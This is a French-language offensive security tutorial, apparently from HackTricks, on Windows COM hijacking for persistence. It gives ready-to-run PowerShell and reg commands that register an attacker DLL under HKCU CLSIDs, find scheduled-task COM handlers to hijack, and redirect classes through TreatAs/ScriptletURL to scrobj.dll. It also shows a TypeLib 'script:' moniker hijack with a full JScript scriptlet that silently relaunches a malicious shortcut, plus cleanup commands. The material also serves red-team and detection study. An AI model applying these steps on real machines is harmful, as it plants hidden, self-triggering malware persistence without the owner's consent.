# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Recherche de composants COM inexistants

Comme les valeurs de HKCU peuvent être modifiées par les utilisateurs, le **COM Hijacking** peut être utilisé comme **mécanisme de persistance**. Avec `procmon`, il est facile de trouver les registres COM recherchés qui n'existent pas encore et qui pourraient être créés par un attaquant. Filtres classiques :

- opérations **RegOpenKey** ;
- lorsque le _Result_ est **NAME NOT FOUND** ;
- et lorsque le _Path_ se termine par **InprocServer32**.

Variantes utiles pendant la recherche :

- Recherchez également les clés **`LocalServer32`** manquantes. Certaines classes COM sont des serveurs out-of-process et lanceront un EXE contrôlé par l'attaquant au lieu d'une DLL.
- Recherchez les opérations de registre **`TreatAs`** et **`ScriptletURL`**, en plus de `InprocServer32`. Les contenus de détection récents et les analyses de malware les mentionnent régulièrement, car elles sont beaucoup plus rares que les enregistrements COM normaux et constituent donc des indicateurs à forte valeur.
- Copiez le **`ThreadingModel`** légitime depuis `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` lors du clonage d'un enregistrement dans HKCU. L'utilisation d'un modèle incorrect interrompt souvent l'activation et rend le hijack plus visible.<sup>[[3]](#references)</sup>
- Sur les systèmes 64 bits, inspectez les vues 64 bits et 32 bits (`procmon.exe` contre `procmon64.exe`, `HKLM\Software\Classes` et `HKLM\Software\Classes\WOW6432Node`), car les applications 32 bits peuvent résoudre un enregistrement COM différent.

Une fois que vous avez décidé quel COM inexistant usurper, exécutez les commandes suivantes. _Soyez prudent si vous décidez d'usurper un COM chargé toutes les quelques secondes, car cela pourrait être excessif._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Composants COM de Task Scheduler détournables

Les tâches Windows utilisent des Custom Triggers pour appeler des objets COM et, puisqu’elles sont exécutées via le Task Scheduler, il est plus facile de prévoir quand elles vont être déclenchées.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

En vérifiant la sortie, vous pouvez en sélectionner un qui sera exécuté **chaque fois qu’un utilisateur se connecte**, par exemple.

Recherchez ensuite le CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** dans **HKEY\CLASSES\ROOT\CLSID**, ainsi que dans HKLM et HKCU. Vous constaterez généralement que la valeur n’existe pas dans HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Ensuite, vous pouvez simplement créer l’entrée HKCU et, chaque fois que l’utilisateur se connecte, votre backdoor sera exécutée.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` permet d’émuler un CLSID avec un autre.<sup>[[4]](#references)</sup> D’un point de vue offensif, cela signifie que vous pouvez laisser le CLSID d’origine intact, créer un second CLSID par utilisateur qui pointe vers `scrobj.dll`, puis rediriger le véritable objet COM vers celui qui est malveillant avec `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Cette approche est utile lorsque :

- l’application cible instancie déjà un CLSID stable lors de la connexion ou au démarrage de l’application
- vous souhaitez une redirection limitée au registre au lieu de remplacer le `InprocServer32` d’origine
- vous souhaitez exécuter un scriptlet `.sct` local ou distant via la valeur `ScriptletURL`

Exemple de workflow (adapté des techniques d’Atomic Red Team publiquement disponibles et d’anciennes recherches sur l’abus du registre COM) :
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Notes :

- `scrobj.dll` lit la valeur `ScriptletURL` et exécute le `.sct` référencé. Vous pouvez donc conserver le payload dans un fichier local ou le récupérer à distance via HTTP/HTTPS.
- `TreatAs` est particulièrement pratique lorsque l’enregistrement COM d’origine est complet et stable dans HKLM, car il suffit d’une petite redirection par utilisateur au lieu de reproduire toute l’arborescence.
- Pour effectuer une validation sans attendre le déclencheur naturel, vous pouvez instancier manuellement le faux ProgID/CLSID avec `rundll32.exe -sta <ProgID-or-CLSID>` si la classe cible prend en charge l’activation STA.

## COM TypeLib Hijacking (script: moniker persistence)

Les bibliothèques de types (TypeLib) définissent les interfaces COM et sont chargées via `LoadTypeLib()`. Lorsqu’un serveur COM est instancié, le système d’exploitation peut également charger la TypeLib associée en consultant les clés de registre sous `HKCR\TypeLib\{LIBID}`. Si le chemin de la TypeLib est remplacé par un **moniker**, par exemple `script:C:\...\evil.sct`, Windows exécutera le scriptlet lors de la résolution de la TypeLib, ce qui permet une persistence discrète déclenchée lorsque des composants courants sont utilisés.

Cette technique a été observée avec le contrôle Microsoft Web Browser (fréquemment chargé par Internet Explorer, les applications intégrant WebBrowser et même `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Étapes (PowerShell)

1) Identifiez la TypeLib (LIBID) utilisée par un CLSID fréquemment sollicité. Exemple de CLSID souvent exploité dans des chaînes de malware : `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Diriger le chemin TypeLib par utilisateur vers un scriptlet local à l’aide du moniker `script:` (aucun droit d’administrateur requis) :
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Déposez un fichier JScript `.sct` minimal qui relance votre payload principal (par ex. un `.lnk` utilisé par la chaîne initiale) :
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Déclenchement – ouvrir IE, une application qui intègre le contrôle WebBrowser, ou même une activité courante dans Explorer chargera la TypeLib et exécutera le scriptlet, réarmant votre chaîne lors de l’ouverture de session/du redémarrage.

Nettoyage
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Notes
- Vous pouvez appliquer la même logique à d'autres composants COM à haute fréquence ; résolvez toujours d'abord le véritable `LIBID` depuis `HKCR\CLSID\{CLSID}\TypeLib`.
- Sur les systèmes 64 bits, vous pouvez également renseigner la sous-clé `win64` pour les consommateurs 64 bits.

## Références

- [1] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
